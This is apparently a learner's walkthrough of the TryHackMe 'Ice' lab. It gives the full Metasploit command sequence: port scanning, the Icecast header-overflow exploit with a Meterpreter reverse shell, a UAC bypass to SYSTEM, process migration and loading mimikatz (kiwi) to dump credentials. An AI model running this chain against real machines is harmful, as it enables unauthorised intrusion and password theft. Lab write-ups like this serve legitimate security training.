@@ -1,0 +1,870 @@
+ICE.
+
+
+
+
+[>>> TASK 1: CONNECT]
+Nothing to do here.
+
+
+
+
+[>>> TASK 2: RECON]
+[2.3. ONCE THE SCAN COMPLETES, WE'LL SEE A NUMBER OF INTERESTING PORTS OPEN ON THIS MACHINE. AS YOU MIGHT HAVE GUESSED, THE FIREWALL HAS BEEN DISABLED (WIT THE SERVICE COMPLETELY SHUTDOWN), LEAVING VERY LITTLE TO PROTECT THIS MACHINE. ONE OF THE MORE INTERESTING PORTS THAT IS OPEN IS THE MICROSOFT REMOTE DESKTOP (MSRDP). WHAT PORT IS THIS OPEN ON?]
+[ACTION: nmap quick syn all port scan]
+nmap -sS -T4 -sV -p- 10.10.235.6
+[OUTPUT]
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  http         Icecast streaming media server
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+49166/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+[NOTE]
+We see no 4 digit port running MSRDP. So we will try other scans.
+[ACTION: quick nmap connect all port scan]
+nmap -sT -T4 -sV -p- 10.10.235.6
+[OUTPUT]
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  http          Icecast streaming media server
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49159/tcp open  msrpc         Microsoft Windows RPC
+49166/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[NOTE]
+A new port popped up: 3389. running ms-wbt-server.
+[ANSWER]
+3389
+ 
+
+
+[2.4. WHAT SERVICE DID NMAP IDENTIFY AS RUNNING ON PORT 8000? (FIRST WORD OF THIS SERVICE)]
+[ANSWER (based on previous outputs)]
+icecast
+
+
+
+[2.5. WHAT DOES NMAP IDENTIFY AS THE HOSTNAME OF THIS MACHINE? (ALL CAPS FOR THE ANSWER)]
+[ANSWER (based on previous outputs)]
+DARK-PC
+
+
+
+
+[>>> TASK 3: GAIN ACCESS]
+[3.1. NOW THAT WE'VE IDENTIFIED SOME INTERESTING SERVICES RUNNING ON OUR TARGET MACHINE, LET'S DO A LITTLE BIT OF RESEARCH INTO ONE OF THE WEIRDER SERVICES IDENTIFIED: ICECAST. ICECAST, OR WELL AT LEAST THIS VERSION RUNNING ON OUR TARGET, IS HEAVILY FLAWED AND HAS A HIGH LEVEL VULNERABILITY WITH A SCORE OF 7.5 (7.4 DEPENDING ON WHERE YOU VIEW IT). WHAT IS THE IMPACT SCORE FOR THIS VULNERABILITY? USE [https://www.cvedetails.com/](https://www.cvedetails.com/) FOR THIS QUESTION AND THE NEXT]
+[ACTION: research]
+We find https://www.cvedetails.com/cve/CVE-2004-1561/, finding CVE-2004-1461. 
+[OUTPUT]
+Metasploit modules for CVE-2004-1561
+ Icecast Header Overwrite
+Disclosure Date: 2004-09-28
+First seen: 2020-04-26
+exploit/windows/http/icecast_header
+This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved inst
+More information
+CVSS scores for CVE-2004-1561
+Base Score	Base Severity	CVSS Vector	Exploitability Score	Impact Score	Score Source	First Seen
+7.5	HIGH	AV:N/AC:L/Au:N/C:P/I:P/A:P	10.0	6.4	NIST	
+[ANSWER]
+6.4
+
+
+
+[3.2. WHAT IS THE CVE NUMBER FOR THIS VULNERABILITY? THIS WILL BE IN THE FORMAT: CVE-0000-0000]
+[ANSWER (from last output)]
+CVE-2004-1561
+
+
+
+[3.3. NOW THAT WE'VE FOUND OUR VULNERABILITY, LET'S FIND OUR EXPLOIT. FOR THIS SECTION OF THE ROOM, WE'LL USE THE METASPLOIT MODULE ASSOCIATED WITH THIS EXPLOIT. LET'S GO AHEAD AND START METASPLOIT USING THE COMMAND `msfconsole`]
+[ACTION: start metasploit]
+msfconsole
+
+
+
+[3.4. AFTER METASPLOIT HAS STARTED, LET'S SEARCH FOR OUR TARGET EXPLOIT USING THE COMMAND 'search icecast'. WHAT IS THE FULL PATH (STARTING WITH EXPLOIT) FOR THE EXPLOITATION MODULE? IF YOU ARE NOT FAMILIAR WITH METASPLOIT, TAKE A LOOK AT THE METASPLOIT MODULE]
+[ACTION: look for icecast exploits]
+search icecast
+[OUTPUT]
+#  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+[ANSWER]
+exploit/windows/http/icecast_header
+
+
+
+[3.4. LET'S GO AHEAD AND SELECT THIS MODULE FOR USE. TYPE EITHER THE COMMAND `use icecast` OR `use 0` TO SELECT OUR SEARCH RESULT]
+[ACTION: choose module]
+use 0
+
+
+
+[3.5. FOLLOWING SELECTING OUR MODULE, WE NOW HAVE TO CHECK WHAT OPTIONS WE HAVE TO SET. RUN THE COMMAND `show options`. WHAT IS THE ONLY REQUIRED SETTING WHICH CURRENTLY IS BLANK?]
+[ACTION: show module options]
+show options
+[OUTPUT]
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://
+                                      docs.metasploit.com/docs/using-m
+                                      etasploit/basics/using-metasploi
+                                      t.html
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '',
+                                        seh, thread, process, none)
+   LHOST     192.168.11.120   yes       The listen address (an interfa
+                                        ce may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+[ANSWER]
+rhosts
+
+
+[3.6. FIRST LET'S CHECK THAT THE LHOST OPTION IS SET TO OUR tun0 IP (WHICH CAN BE FOUND ON THE ACCESS PAGE). WITH THTAT DONE, LET'S SET THAT LAST OPTION FOR OUR TARGET IP. NOW THAT WE HAVE EVERYTHING READY TO GO, LET'S RUN OUR EXPLOIT USING THE COMMAND `exploit`]
+[ACTION: completing options]
+set LHOST 10.23.25.109
+set RHOSTS 10.10.235.6
+
+
+[ACTION: run exploit]
+exploit
+[OUTPUT]
+meterpreter >
+
+
+
+
+[4. ESCALATE]
+[4.1. WOOHOO! WE'VE GAINED A FOOTHOLD INTO OUR VICTIM MACHINE! WHAT'S THE NAME OF THE SHELL WE HAVE NOW?]
+[ANSWER (based on last output)]
+meterpreter
+
+
+
+[4.2. WHAT USER WAS RUNNING THE ICECAST PROCESS? THE COMMANDS USED IN THIS QUESTION AND THE NEXT FEW ARE TAKEN DIRECTLY FROM THE 'METASPLOIT' MODULE]
+[ACTION: check the user we are running as]
+getuid
+[OUTPUT]
+Server username: Dark-PC\Dark
+[ANSWER]
+Dark
+
+
+
+[4.3. WHAT BUILD OF WINDOWS IS THE SYSTEM?]
+[ACTION: get intel on target system]
+sysinfo
+[OUTPUT]
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+[ANSWER]
+7601
+
+
+
+[4.4. NOW THAT WE KNOW SOME OF THE FINER DETAILS OF THE SYSTEM WE ARE WORKING WITH, LET'S START ESCALATING OUR PRIVILEGES. FIRST, WHAT IS THE ARCHITECTURE OF THE PROCESS WE'RE RUNNING?]
+[ANSWER (from last output)]
+x64
+
+
+
+[4.5. NOW THAT WE KNOW THE ARCHITECTURE OF THE PROCESS, LET'S PERFORM SOME FURTHER RECON. WHILE THIS DOESN'T WORK FOR THE BEST ON x64 MACHINES, LET'S NOW RUN THE FOLLOWING COMMAND `run post/multi/recon/local_exploit_suggester`. *THIS CAN APPEAR TO HANG AS IT TESTS EXPLOITS AND MIGHT TAKE SEVERAL MINUTES TO COMPLETE]
+[ACTION: run the mentioned command]
+run post/multi/recon/local_exploit_suggester
+[OUTPUT]
+#   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
+ 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
+ 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
+ 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
+ 10  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+ 11  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+ 12  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 13  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 14  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 15  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
+ 16  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 17  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
+ 18  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 19  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+ 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 21  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
+ 22  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
+ 23  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 24  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 25  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
+ 26  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
+ 27  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
+ 28  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
+ 29  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
+ 30  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
+ 31  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
+ 32  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
+ 33  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
+ 34  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
+ 35  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 36  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
+ 37  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
+ 38  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
+ 39  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
+ 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
+
+
+
+[4.6. RUNNING THE LOCAL EXPLOIT SUGGESTER WILL RETURN QUITE A FEW RESULTS FOR POTENTIAL ESCALATION EXPLOITS. WHAT IS THE FULL PATH (STARTING WITH /exploit/ FOR THE RIST RETURNED EXPLOIT?]
+[ANSWER (based on last output)]
+exploit/windows/local/bypassuac_eventvwr
+[NOTE]
+Actually, the first returned exploit is: exploit/windows/local/bypassuac_comhijack
+
+
+
+[4.7. NOW THAT WE HAVE AN EXPLOIT IN MIND FOR ELEVATING OUR PRIVILEGES, LET'S BACKGROUND OUR CURRENT SESSION USING THE COMMAND `background`OR `CTRL + z`. TAKE NOTE OF WHAT SESSION NUMBER WE HAVE, THIS WILL LIKELY BE 1 IN THIS CASE. WE CAN LIST ALL OUR ACTIVE SESSIONS WITH THE COMMAND `sessions` WHEN OUTSIDE OF THE METERPRETER SHELL]
+[ACTION: background session]
+CTRL + z
+[NOTE]
+Session number is 1.
+
+
+
+[4.8. GO AHEAD AND SELECT OUR PREVIOUSLY FOUND LOCAL EXPLOIT FOR USE USING THE COMMAND `use FULL_PATH_FOR_EXPLOIT`]
+[ACTION: set exploit]
+use exploit/windows/local/bypassuac_eventvwr
+
+
+
+[4.9. LOCAL EXPLOITS REQUIRE A SESSION TO BE SELECTED (SOMETHING WE CAN VERIFY WITH THE COMMAND `show options`), SET THIS NOW USING THE COMMAND `set session SESSION_NUMBER`]
+[ACTION: set session]
+set session 1
+
+
+
+[4.10. NOW THAT WE'VE SET OUR SESSION NUMBER, FURTHER OPTIONS WILL BE REVEALED IN THE OPTIONS MENU. WE'LL HAVE TO SET ONE MORE AS OUR LISTENER IP ISN'T CORRECT. WHAT IS THE NAME OF THIS OPTION?]
+[ANSWER]
+LHOST
+
+
+
+[4.11. SET THIS OPTION NOW. YOU MIGHT HAVE TO CHECK YOUR IP ON THE TRYHACKME NETWORK USING THE COMMAND `ip addr`]
+[ACTION: set lhost]
+set LHOST 10.23.25.109
+
+
+
+[4.12. AFTER WE'VE SET THIS LAST OPTION, WE CAN NOW RUN OUR PRIVILEGE ESCALATION EXPLOIT. RUN THIS NOW USING THE COMMAND `run`. NOTE, THIS MIGHT TAKE A FEW ATTEMPTS AS YOU MAY NEED TO RELAUNCH THE BOX AND EXPLOIT THE SERVICE IN THE CASE THAT THIS FAILS]
+[ACTION: run exploit]
+run
+[OUTPUT]
+[*] Started reverse TCP handler on 10.23.25.109:4444 
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[*] Configuring payload and stager registry keys ...
+[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[*] Sending stage (177734 bytes) to 10.10.235.6
+[*] Meterpreter session 2 opened (10.23.25.109:4444 -> 10.10.235.6:49285) at 2025-07-25 15:10:06 +0200
+[*] Cleaning up registry keys ...
+
+
+
+[4.13. FOLLOWING COMPLETION OF THIS PRIVILEGE ESCALATION A NEW SESSION WILL BE OPENED. INTERACT WITH IT NOW USING THE COMMAND `sessions SESSION_NUMBER`]
+[ACTION: change to privesc session]
+sessions 2
+
+
+
+[4.14. WE CAN NOW VERIFY THAT WE HAVE EXPANDED PERMISSIONS USING THE COMMAND `getprivs`. WHAT PERMISSION LISTED ALLOWS US TO TAKE OWNERSHIP OF FILES?]
+[ACTION: check permissions]
+getprivs
+[NOTE]
+We got no output since our session died. 
+I had to rerun the exploit.
+[OUTPUT]
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+[ANSWER]
+SeTakeOwnershipPrivilege
+
+
+
+
+[>>> TASK 5: LOOTING]
+[5.1. PRIOR TO FURTHER ACTION, WE NEED TO MOVE TO A PROCESS THAT ACTUALLY HAS THE PERMISSIONS THAT WE NEED TO INTERACT WITH THE LSASS SERVICE, THE SERVICE RESPONSIBLE FOR AUTHENTICATION WITHIN WINDOWS. FIST, LET'S LIST THE PROCESSES USING THE COMMAND `ps`. NOTE, WE CAN SEE PROCESSES BEING RUN BY NT AUTHORITY\SYSTEM AS WE HAVE ESCALATED PERMISSIONS (EVEN THOUGH OUR PROCESS DOESN'T)]
+[ACTION: list running processes]
+ps
+[OUTPUT]
+Process List
+============
+
+ PID   PPID  Name       Arch  Session  User           Path
+ ---   ----  ----       ----  -------  ----           ----
+ 0     0     [System P
+             rocess]
+ 4     0     System     x64   0
+ 416   4     smss.exe   x64   0        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\smss.exe
+ 448   816   slui.exe   x64   1        Dark-PC\Dark   C:\Windows\Sys
+                                                      tem32\slui.exe
+ 544   536   csrss.exe  x64   0        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\csrss.ex
+                                                      e
+ 592   536   wininit.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        SYSTEM         tem32\wininit.
+                                                      exe
+ 604   584   csrss.exe  x64   1        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\csrss.ex
+                                                      e
+ 652   584   winlogon.  x64   1        NT AUTHORITY\  C:\Windows\Sys
+             exe                       SYSTEM         tem32\winlogon
+                                                      .exe
+ 680   688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        SYSTEM         tem32\svchost.
+                                                      exe
+ 688   592   services.  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             exe                       SYSTEM         tem32\services
+                                                      .exe
+ 696   592   lsass.exe  x64   0        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\lsass.ex
+                                                      e
+ 704   592   lsm.exe    x64   0        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\lsm.exe
+ 816   688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        SYSTEM         tem32\svchost.
+                                                      exe
+ 848   688   SearchInd  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             exer.exe                  SYSTEM         tem32\SearchIn
+                                                      dexer.exe
+ 884   688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        NETWORK SERVI  tem32\svchost.
+                                       CE             exe
+ 932   688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        LOCAL SERVICE  tem32\svchost.
+                                                      exe
+ 1020  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        SYSTEM         tem32\svchost.
+                                                      exe
+ 1056  688   sppsvc.ex  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             e                         NETWORK SERVI  tem32\sppsvc.e
+                                       CE             xe
+ 1064  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        LOCAL SERVICE  tem32\svchost.
+                                                      exe
+ 1140  1572  Icecast2.  x86   1        Dark-PC\Dark   C:\Program Fil
+             exe                                      es (x86)\Iceca
+                                                      st2 Win32\Icec
+                                                      ast2.exe
+ 1148  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        NETWORK SERVI  tem32\svchost.
+                                       CE             exe
+ 1180  604   conhost.e  x64   1        Dark-PC\Dark   C:\Windows\Sys
+             xe                                       tem32\conhost.
+                                                      exe
+ 1268  688   spoolsv.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        SYSTEM         tem32\spoolsv.
+                                                      exe
+ 1332  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        LOCAL SERVICE  tem32\svchost.
+                                                      exe
+ 1436  688   taskhost.  x64   1        Dark-PC\Dark   C:\Windows\Sys
+             exe                                      tem32\taskhost
+                                                      .exe
+ 1516  688   amazon-ss  x64   0        NT AUTHORITY\  C:\Program Fil
+             m-agent.e                 SYSTEM         es\Amazon\SSM\
+             xe                                       amazon-ssm-age
+                                                      nt.exe
+ 1560  1020  dwm.exe    x64   1        Dark-PC\Dark   C:\Windows\Sys
+                                                      tem32\dwm.exe
+ 1572  1540  explorer.  x64   1        Dark-PC\Dark   C:\Windows\exp
+             exe                                      lorer.exe
+ 1744  688   LiteAgent  x64   0        NT AUTHORITY\  C:\Program Fil
+             .exe                      SYSTEM         es\Amazon\Xent
+                                                      ools\LiteAgent
+                                                      .exe
+ 1764  1736  powershel  x86   1        Dark-PC\Dark   C:\Windows\Sys
+             l.exe                                    WOW64\WindowsP
+                                                      owershell\v1.0
+                                                      \powershell.ex
+                                                      e
+ 1780  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        LOCAL SERVICE  tem32\svchost.
+                                                      exe
+ 1984  688   Ec2Config  x64   0        NT AUTHORITY\  C:\Program Fil
+             .exe                      SYSTEM         es\Amazon\Ec2C
+                                                      onfigService\E
+                                                      c2Config.exe
+ 2128  744   powershel  x86   1        Dark-PC\Dark   C:\Windows\Sys
+             l.exe                                    WOW64\WindowsP
+                                                      owershell\v1.0
+                                                      \powershell.ex
+                                                      e
+ 2232  816   WmiPrvSE.  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             exe                       NETWORK SERVI  tem32\wbem\Wmi
+                                       CE             PrvSE.exe
+ 2316  688   vds.exe    x64   0        NT AUTHORITY\  C:\Windows\Sys
+                                       SYSTEM         tem32\vds.exe
+ 2568  688   svchost.e  x64   0        NT AUTHORITY\  C:\Windows\Sys
+             xe                        NETWORK SERVI  tem32\svchost.
+                                       CE             exe
+ 2684  604   conhost.e  x64   1        Dark-PC\Dark   C:\Windows\Sys
+             xe                                       tem32\conhost.
+                                                      exe
+ 2916  688   TrustedIn  x64   0        NT AUTHORITY\  C:\Windows\ser
+             staller.e                 SYSTEM         vicing\Trusted
+             xe                                       Installer.exe
+
+
+
+[5.2. ...WHAT IS THE NAME OF THE PRINTER SERVICE?]
+[NOTE]
+We are looking for something related to printer spool service.
+[ANSWER (fromlast output)]
+spoolsv.exe
+
+
+
+[5.3. MIGRATE TO THIS PROCESS NOW WITH THE COMMAND `migrate -N PROCESS_NAME`]
+[ACTION: migrate to printer]
+migrate -N spoolsv.exe
+[OUTPUT]
+[*] Migrating from 2128 to 1268...
+[*] Migration completed successfully.
+
+
+
+[5.4. LET'S CHECK WHAT USER WE ARE NOW WITH THE COMMAND `getuid`. WHAT USER IS LISTED?]
+[ACTION: check user we are running as]
+getuid
+[OUTPUT]
+Server username: NT AUTHORITY\SYSTEM
+[ANSWER]
+NT AUTHORITY\SYSTEM
+
+
+
+[5.5. NOW THAT WE'VE MADE OUR WAY TO FULL ADMINISTRATOR PERMISSIONS WE'LL SET OUR SIGHTS ON LOOTING. MIMIKATZ IS A RATHER INFAMOUS PASSWORD DUMPING TOOL THAT IS INCREDIBLY USEFUL. LOAD IT NOW USING THE COMMAND `load kiwi` (KIWI IS THE UPDATED VERSION OF MIMIKATZ)]
+[ACTION: load mimikatz]
+load kiwi
+
+
+
+[5.6. LOADING KIWI INTO OUR METERPRETER SESSION WILL EXPAND OUR HELP MENU, TAKE A LOOK AT THE NEWLY ADDED SECTION OF THE HELP MENU NOW VIA THE COMMAND `help`]
+[ACTION: display kiwi/mimkatz manual]
+help
+[OUTPUT]
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a bac
+                              kground thread
+    channel                   Displays information or control active
+                               channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for ht
+                              tp/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post modu
+                              le
+    irb                       Open an interactive Ruby shell on the
+                              current session
+    load                      Load one or more meterpreter extension
+                              s
+    machine_id                Get the MSF ID of the machine attached
+                               to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current s
+                              ession
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post
+                              module
+    secure                    (Re)Negotiate TLV packet encryption on
+                               the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re
+                              -establish session
+    ssl_verify                Modify the SSL certificate verificatio
+                              n setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the scr
+                              een
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias f
+                              or lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to t
+                              he screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    show_mount                List all mount points/logical drives
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuratio
+                              n
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote servi
+                              ce
+    resolve                   Resolve a set of host names on the tar
+                              get
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    clearev                   Clear the event log
+    drop_token                Relinquishes any active impersonation
+                              token.
+    execute                   Execute a command
+    getenv                    Get one or more environment variable v
+                              alues
+    getpid                    Get the current process identifier
+    getprivs                  Attempt to enable all privileges avail
+                              able to the current process
+    getsid                    Get the SID of the user that the serve
+                              r is running as
+    getuid                    Get the user that the server is runnin
+                              g as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date
+                              and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    reboot                    Reboots the remote computer
+    reg                       Modify and interact with the remote re
+                              gistry
+    rev2self                  Calls RevertToSelf() on the remote mac
+                              hine
+    shell                     Drop into a system command shell
+    shutdown                  Shuts down the remote computer
+    steal_token               Attempts to steal an impersonation tok
+                              en from the target process
+    suspend                   Suspends or resumes a list of processe
+                              s
+    sysinfo                   Gets information about the remote syst
+                              em, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command                   Description
+    -------                   -----------
+    enumdesktops              List all accessible desktops and windo
+                              w stations
+    getdesktop                Get the current meterpreter desktop
+    idletime                  Returns the number of seconds the remo
+                              te user has been idle
+    keyboard_send             Send keystrokes
+    keyevent                  Send key events
+    keyscan_dump              Dump the keystroke buffer
+    keyscan_start             Start capturing keystrokes
+    keyscan_stop              Stop capturing keystrokes
+    mouse                     Send mouse events
+    screenshare               Watch the remote user desktop in real
+                              time
+    screenshot                Grab a screenshot of the interactive d
+                              esktop
+    setdesktop                Change the meterpreters current deskto
+                              p
+    uictl                     Control some of the user interface com
+                              ponents
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    record_mic                Record audio from the default micropho
+                              ne for X seconds
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified web
+                              cam
+    webcam_stream             Play a video stream from the specified
+                               webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on t
+                              he target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command                   Description
+    -------                   -----------
+    getsystem                 Attempt to elevate your privilege to t
+                              hat of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command                   Description
+    -------                   -----------
+    hashdump                  Dumps the contents of the SAM database
+
+
